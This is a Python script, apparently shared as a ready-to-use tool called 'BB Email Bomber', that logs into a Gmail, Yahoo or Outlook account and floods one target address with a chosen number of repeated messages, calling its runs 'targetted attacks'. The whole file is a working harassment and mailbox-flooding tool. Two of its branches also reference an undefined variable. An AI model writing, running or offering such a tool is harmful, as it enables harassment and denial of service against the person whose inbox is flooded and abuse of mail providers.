#!/usr/bin/python
import smtplib
import time
import os
import getpass
import sys
import random

class bcolors:
	OKGREEN = '\033[96m'
	WARNING = '\033[92m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'


def bomb(rMail):
	os.system('clear')
	print(bcolors.OKGREEN + '''
			 \|/
                       `--+--'
                          |
                      ,--'#`--.
                      |#######|
                   _.-'#######`-._
                ,-'###############`-.
              ,'#####################`,         .__         .
             |#########################|        [__) _ ._ _ |_  _ ._.
            |###########################|       [__)(_)[ | )[_)(/,[
           |#############################|
           |#############################|      Author: Sadman Sakib Jisan & Raihan Chowdhury
           |#############################|
            |###########################|
             \#########################/
              `.#####################,'
                `._###############_,'
                   `--..#####..--'                                 ,-.--.
*.______________________________________________________________,' (Bomb)
                                                                    `--' \n\nBB Email Bomber is Running For: ''' + rMail + "\n\n" + bcolors.ENDC)


os.system('clear')
try:
	file1 = open('Banner.txt', 'r')
	print(' ')
	print(bcolors.OKGREEN + file1.read() + bcolors.ENDC)
	file1.close()
except IOError:
	print('Banner File not found')

#Input
print(bcolors.WARNING + '''
Choose a Mail Service:
1) Gmail
2) Yahoo
3) Hotmail/Outlook
''' + bcolors.ENDC + '--------------------------------------------------------------')
try:
	server = input(bcolors.OKGREEN + 'Mail Server: ' + bcolors.ENDC)
	user = input(bcolors.OKGREEN + 'Your Email: ' + bcolors.ENDC)
	pwd = getpass.getpass(bcolors.OKGREEN + 'Password: ' + bcolors.ENDC)
	to = input(bcolors.OKGREEN + 'To: ' + bcolors.ENDC)
	subject = input(bcolors.OKGREEN + 'Subject: ' + bcolors.ENDC)
	body = input(bcolors.OKGREEN + 'Message: ' + bcolors.ENDC)
	nomes = input(bcolors.OKGREEN + 'Number of Emails to send: ' + bcolors.ENDC)
	nomes = int(nomes)
	no = 0
	message = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
except KeyboardInterrupt:
	print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
	sys.exit()

#Gmail

if server == '1' or server == 'gmail' or server == 'Gmail':
	bomb(to)
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.ehlo()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		print(bcolors.FAIL + '''Your Username or Password is incorrect, please try again using the correct credentials
		Or you need to enable less secure apps
		On Gmail: https://myaccount.google.com/lesssecureapps ''' + bcolors.ENDC)
		sys.exit()
	while no != nomes:
		try:
			message = 'From: ' + user + '\nSubject: ' + subject + str(no) + '\n' + body
			server.sendmail(user, to, message)
			print(bcolors.WARNING + 'Successfully sent ' + str(no+1) + ' emails' + bcolors.ENDC)
			no += 1
			time.sleep(.8)
		except KeyboardInterrupt:
			print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
			sys.exit()
		except:
			print(bcolors.FAIL + "Failed to Send" + bcolors.ENDC)
	print(bcolors.OKGREEN + '\nBB Email Bomber Has finished Targetted Attacks Successfully\n' + bcolors.ENDC)
	server.close()
	
#Yahoo
elif server == '2' or server == 'Yahoo' or server == 'yahoo':
	server = smtplib.SMTP("smtp.mail.yahoo.com", 587)
	bomb(rMail)
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		print(bcolors.FAIL + '''Your Username or Password is incorrect, please try again using the correct credentials
		Or you need to enable less secure apps
		On Yahoo: https://login.yahoo.com/account/security?.scrumb=Tiby8TXUvJt#less-secure-apps
		''' + bcolors.ENDC)
		sys.exit()
	while no != nomes:
		try:
			message = 'From: ' + user + '\nSubject: ' + subject + str(no) + '\n' + body
			server.sendmail(user, to, message)
			print(bcolors.WARNING + 'Successfully sent ' + str(no + 1) + ' emails' + bcolors.ENDC)
			no += 1
			time.sleep(.8)
		except KeyboardInterrupt:
			print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
			sys.exit()
		except:
			print(bcolors.FAIL + "Failed to Send" + bcolors.ENDC)
	print(bcolors.OKGREEN + '\nBB Email Bomber Has finished Targetted Attacks Successfully\n' + bcolors.ENDC)
	server.close()
	
#Hotmail/Outlook
elif server == '3' or server == 'outlook' or server == 'Outlook' or server == 'Hotmail' or server == 'hotmail':
	server = smtplib.SMTP("smtp-mail.outlook.com", 587)
	bomb(rMail)
	server.ehlo()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		print(bcolors.FAIL + 'Your Username or Password is incorrect, please try again using the correct credentials' + bcolors.ENDC)
		sys.exit()
	while no != nomes:
		try:
			message = 'From: ' + user + '\nSubject: ' + subject + str(no) + '\n' + body
			server.sendmail(user, to, message)
			print(bcolors.WARNING + 'Successfully sent ' + str(no + 1) + ' emails' + bcolors.ENDC)
			no += 1
			time.sleep(.8)
		except KeyboardInterrupt:
			print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
			sys.exit()
		except smtplib.SMTPAuthenticationError:
			print('\nThe username or password you entered is incorrect.')
			sys.exit()
		except:
			print(bcolors.FAIL + "Failed to Send" + bcolors.ENDC)
	print(bcolors.OKGREEN + '\nBB Email Bomber Has finished Targetted Attacks Successfully\n' + bcolors.ENDC)
	server.close()
	
else:
	print('Works only with Gmail, Yahoo, Outlook and Hotmail.')
	sys.exit()

